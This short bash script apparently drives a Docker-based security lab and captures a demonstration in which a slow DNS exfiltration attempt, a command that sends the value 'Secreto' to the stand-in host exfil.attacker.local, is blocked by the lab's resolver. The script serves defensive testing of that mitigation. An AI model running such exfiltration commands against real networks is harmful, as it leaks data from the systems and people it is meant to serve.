#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
source "${ROOT}/lib/capture_helpers.sh"
init_compose "p10m" "docker-compose.yml"
trap 'teardown_lab 2>/dev/null || true' EXIT

setup_lab
sleep 4

section "10" "SLOW DNS EXFILTRATION" "MITIGADO"
prompt_attack "10.9.0.102" "python3 /lab/slow_dns.py exfil.attacker.local Secreto"
run_exec host python3 /lab/slow_dns.py exfil.attacker.local Secreto || true
sleep 3
blank_line
prompt_server "10.9.0.53" "docker compose logs resolver  # consulta bloqueada"
${COMPOSE} logs resolver 2>/dev/null | tail -8 || true
echo "[+] Exfiltración bloqueada — subdominio anómalo rechazado"

teardown_lab
